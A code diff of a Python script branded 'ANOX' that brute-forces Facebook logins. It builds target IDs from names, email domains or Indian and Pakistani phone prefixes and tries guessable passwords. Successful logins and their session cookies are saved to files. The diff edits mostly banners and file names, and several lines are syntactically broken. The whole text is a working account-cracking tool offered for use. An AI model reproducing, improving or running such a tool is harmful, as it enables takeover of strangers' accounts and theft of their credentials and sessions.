@@ -79,11 +79,15 @@ for xd in range(10000):
 logo = ("""
 
 \x1b[1;93m
-   db    88b 88  dP"Yb  Yb  dP 
-  dPYb   88Yb88 dP   Yb  YbdP  
- dP__Yb  88 Y88 Yb   dP  dPYb  
-dP    Yb 88  Y8  YbodP  dP  Yb 
-______CLONING_ANOX_______
+
+        ___      .__   __.   ______   ___   ___ 
+       /   \     |  \ |  |  /  __  \  \  \ /  / 
+      /  ^  \    |   \|  | |  |  |  |  \  V  /  
+     /  /_\  \   |  . `  | |  |  |  |   >   <   
+    /  _____  \  |  |\   | |  `--'  |  /  .  \  
+   /__/     \__\ |__| \__|  \______/  /__/ \__\ 
+                                                
+   
 [+]==============================================
 [+] CREATED BY   :  ANOX 
 [+] COUNTRY        :  INDIA
@@ -122,8 +126,8 @@ def v1():
     user=[]
     os.system('clear')
     print(logo)
-    kode = input(' [❤️]  TERGET FIRST NAME : ')
-    kodex = input(' ❤️] TERGET LAST NAME :  ')
+    kode = input(' [🔥]  TERGET FIRST NAME : ')
+    kodex = input(' [🔥] TERGET LAST NAME :  ')
     print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
     doamin = input(' [📧]  Input Doamin  : ')
     limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
@@ -137,7 +141,7 @@ def v1():
         print(' [🔥]  Total ids:\033[1;92m '+tl)
         print(f"\033[1;97m [🔥]  Target -NAME:\033[1;92m {doamin}")
         print(' \033[1;97m[🔥]  The process has been started')
-        print(' [🔥]  Wait for ids airoplane mode on off ')
+        print(' [🔥]  Wait for ids ')
         print(50*'_')
         for guru in user:
             uid = kode+kodex+guru+doamin
@@ -172,15 +176,14 @@ def v2():
             pwx = [kode,kode kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
-def v3():
     print(' [💜] Crack process has been completed')
-    print(' [💙] Ids saved in ok.txt,cp.txt')
+    print(' 💙] Ids saved in ok.txt,cp.txt')
     print(50*'_')
 def v3():
     user=[]
     os.system('clear')
     print(logo)
-    print(" INDIA SIM CODE=><>< +91637,+91981,+91974,+91830,+91937")
+    print(" INDIA SIM CODE=><>< +91987,+91637,+91997,+91638,+91836")
     print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
     print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
     print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
@@ -190,7 +193,7 @@ def v3():
     kode = input(' [📞] ENTER SIM CODE: ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
-    doamin = ' FACEBOOK VIP CLONING (INDIAN NUMBER) '
+    doamin = ' FACEBOOK VIP CLONING (INDIANNUMBER) '
     limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
@@ -199,18 +202,18 @@ def v3():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' \033[1;33m[>>]  TOTAL IDS :\033[1;92m '+tl)
-        print(f"\033[1;33m[>>]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
-        print(' \033[1;33m[>>]  THE CRACK PROCESS HAS BEEN STARTED')
-        print(' \033[1;33m[>>]  WAIT FOR IDS AIROPLANE MODE ON OFF')
+        print(' \033[1;33m[🌞]  TOTAL IDS :\033[1;92m '+tl)
+        print(f"\033[1;33m[🌞]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
+        print(' \033[1;33m[🌞]  THE CRACK PROCESS HAS BEEN STARTED')
+        print(' \033[1;33m[🌞]  WAIT FOR IDS ')
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,59039200,57575751,'57273200']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'57273200']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
-    print(' [♥] Crack process has been completed')
-    print(' [♥] Ids saved in ok.txt,cp.txt')
+    print(' [🌏] Crack process has been completed')
+    print(' [🌎] Ids saved in ok.txt,cp.txt')
     print(50*'_')
 def rcrack1(uid,pwx,tl):
     global loop
@@ -255,22 +258,22 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[ANOX-OK🌻] {uid}|{ps}")
-                print(f"\n[COOKIE✅️] : {coki}")
-                open('/sdcard/anox-911-cookie.txt','a'). write(uid+'|'+ps+'|' +coki+'\n')
+                print(f"\033[38;5;46m[ANOX-OK✅️] {uid}|{ps}")
+                print(f"\n[COOKIE🎁] : {coki}")
+                open('/sdcard/ANOX911/ok.txt', 'a').write( uid+' | '+ps+' | '+coki'+\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[ANOX-CP😅] {uid}|{ps}")
-                open('/sdcard/ANOX911-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[ANOX-CP🚫] {uid}|{ps}")
+                open('/sdcard/U7P4L-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[ANOX911] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[ANOX--] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
